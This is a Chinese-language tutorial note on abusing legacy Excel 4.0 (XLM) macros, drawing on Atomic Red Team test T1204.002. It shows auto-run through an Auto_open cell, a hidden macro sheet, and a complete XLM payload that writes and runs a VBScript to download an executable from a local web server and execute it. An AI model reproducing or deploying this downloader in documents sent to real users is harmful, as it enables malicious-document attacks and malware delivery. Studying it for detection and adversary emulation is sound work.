# Excel4.0宏

> [利用Excel 4.0宏执行任意命令 | AdminTony's Blog](http://www.admintony.com/Excel-4-0-macros.html)
>
> [atomic-red-team/atomics/T1204.002/T1204.002.md at 2dcdc27df73cc343d308e7c0afa37f2d77aa02e1 · Ayusummer/atomic-red-team (github.com)](https://github.com/Ayusummer/atomic-red-team/blob/2dcdc27df73cc343d308e7c0afa37f2d77aa02e1/atomics/T1204.002/T1204.002.md#atomic-test-6---excel-4-macro)
>
> ---
>
> [使用 Excel 4.0 宏 - Microsoft 支持](https://support.microsoft.com/zh-cn/office/使用-excel-4-0-宏-ba8924d4-e157-4bb2-8d76-2c07ff02e0b8)
>
> ---
>
> [老树开新花：利用Excel 4.0宏躲避杀软检测的攻击技术分析 (qq.com)](https://mp.weixin.qq.com/s/KVpO02KJWE6OVZDb0ungOA)
>
> [Old school: evil Excel 4.0 macros (XLM) | Outflank](https://www.outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)

Excel 4.0 宏是一种在 Microsoft Excel 中使用的宏语言，它是 Excel 中较早期版本的一部分，通常用于自动化和批处理任务。Excel 4.0 宏提供了一组命令和函数，可以执行各种操作，包括计算、数据操作、格式设置等。

Microsoft很早就使用VBA宏（Visual Basic for Applications）来代替Excel 4.0宏技术，这导致Excel 4.0宏并不为大众所熟知。并且Excel 4.0宏存放在Excel 97 - 2003格式（.xls）文件中。

默认情况下 office 是禁用宏的, 要启用 Excel4.0宏支持需要

`打开 Excel -> 文件 -> 选项 -> 信任中心 -> 信任中心设置 -> 宏设置 -> 启用所有宏`

![image-20240422170036218](http://cdn.ayusummer233.top/DailyNotes/202404221700959.png)

创建一个新的 Excel 工作簿, `右键 Sheet1 -> 插入 -> MS Excel 4.0 宏表`

![image-20240422170503721](http://cdn.ayusummer233.top/DailyNotes/202404221706938.png)

![image-20240422170635598](http://cdn.ayusummer233.top/DailyNotes/202404221706681.png)

`确定` 后可以看到多了一张名为 `宏1` 的表, 可以在其中输入 XLM宏, 然后可以单击任何单元格并在此单元格和竖直下面的单元格中输入宏公式

![image-20240422170717659](http://cdn.ayusummer233.top/DailyNotes/202404221707820.png)

XLM 宏有如下特征:

- **函数式宏**：XLM 宏通常以函数的形式出现在 Excel 单元格中。这些函数以等号（=）开头，后面跟随一系列的参数和函数名。例如：`=HALT()`。
- **内置函数**：XLM 提供了一系列内置函数，用于执行各种操作，如文件操作、计算、格式设置等。例如：`HALT()` 用于停止执行宏，`GOTO()` 用于跳转到指定位置等。
- **参数**：XLM 函数可以带有参数，用于指定函数执行时所需的信息。参数可以是常量、单元格引用或者其他函数的返回值。
- **宏表**：除了存储在单元格中，XLM 宏还可以存储在 Excel 的宏表中。宏表是一种特殊的工作表，其中的内容被解释为宏代码而不是普通的数据。你可以在 Excel 中创建宏表，并在其中编写 XLM 宏代码。
- **简单的语法**：相比于 VBA（Visual Basic for Applications），XLM 的语法相对简单。它没有像 VBA 那样的完整的编程语言功能，但足以完成一些基本的自动化任务。

例如写一个调起计算器的 XLM:

```
=EXEC("calc.exe")
=HALT()
```

然后可以右键宏起始单元格选择 `执行`

![image-20240422173251380](http://cdn.ayusummer233.top/DailyNotes/202404221732515.png)

![image-20240422173504260](http://cdn.ayusummer233.top/DailyNotes/202404221735383.png)

![image-20240422173531256](http://cdn.ayusummer233.top/DailyNotes/202404221735362.png)

---

## 自动执行

如果希望在打开工作簿时自动运行宏（类似于VBA宏的 `Sub AutoOpen()`）可以将宏的第一个单元格重命名为`Auto_open`

![image-20240422174158340](http://cdn.ayusummer233.top/DailyNotes/202404221741405.png)

保存时选择 `Excel 97-2003 工作簿(*.xls)`

![image-20240422174251880](http://cdn.ayusummer233.top/DailyNotes/202404221742953.png)

再打开这个文件时会自动执行宏

![image-20240422174334700](http://cdn.ayusummer233.top/DailyNotes/202404221743787.png)

---

## 隐藏表单

![image-20240422174355987](http://cdn.ayusummer233.top/DailyNotes/202404221743058.png)

![image-20240422174404534](http://cdn.ayusummer233.top/DailyNotes/202404221744642.png)

即便隐藏了, 设置自动执行的宏也会自动执行

![image-20240422174438706](http://cdn.ayusummer233.top/DailyNotes/202404221744835.png)

---

## 加载 shellcode

> [老树开新花：利用Excel 4.0宏躲避杀软检测的攻击技术分析 (qq.com)](https://mp.weixin.qq.com/s/KVpO02KJWE6OVZDb0ungOA)
>
> [Old school: evil Excel 4.0 macros (XLM) | Outflank](https://www.outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)

---

## 下载与执行远程文件

虽然 XLM 不支持网络操作和文件下载, 但是可以通过新建并写入一个 VBScript 并运行来实现下载与运行

例如

```
Win10Pro
procexp.exe
atomic_redteam_x4m_exec.vbs
=IF(ISNUMBER(SEARCH("64",GET.WORKSPACE(1))), GOTO(A5),)
=FOPEN("C:\Users\"&A1&"\AppData\Local\Temp\"&A3&"", 3)
=FWRITELN(A5, "url = ""http://127.0.0.1:8000/download/msedge.exe""")
=FWRITELN(A5, "")
=FWRITELN(A5, "Set winHttp = CreateObject(""WinHTTP.WinHTTPrequest.5.1"")")
=FWRITELN(A5, "winHttp.Open ""GET"", url, False")
=FWRITELN(A5, "winHttp.Send")
=FWRITELN(A5, "If winHttp.Status = 200 Then")
=FWRITELN(A5, "Set oStream = CreateObject(""ADODB.Stream"")")
=FWRITELN(A5, "oStream.Open")
=FWRITELN(A5, "oStream.Type = 1")
=FWRITELN(A5, "oStream.Write winHttp.responseBody")
=FWRITELN(A5, "oStream.SaveToFile ""C:\Users\"&A1&"\AppData\Local\Temp\"&A2&""", 2")
=FWRITELN(A5, "oStream.Close")
=FWRITELN(A5, "End If")
=FCLOSE(A5)
=EXEC("explorer.exe C:\Users\"&A1&"\AppData\Local\Temp\"&A3&"")
=WAIT(NOW()+"00:00:05")
=EXEC("explorer.exe C:\Users\"&A1&"\AppData\Local\Temp\"&A2&"")
=HALT()
```

![image-20240422190714511](http://cdn.ayusummer233.top/DailyNotes/202404221907695.png)

![image-20240422191356514](http://cdn.ayusummer233.top/DailyNotes/202404221913585.png)

![image-20240422191427234](http://cdn.ayusummer233.top/DailyNotes/202404221914321.png)

---















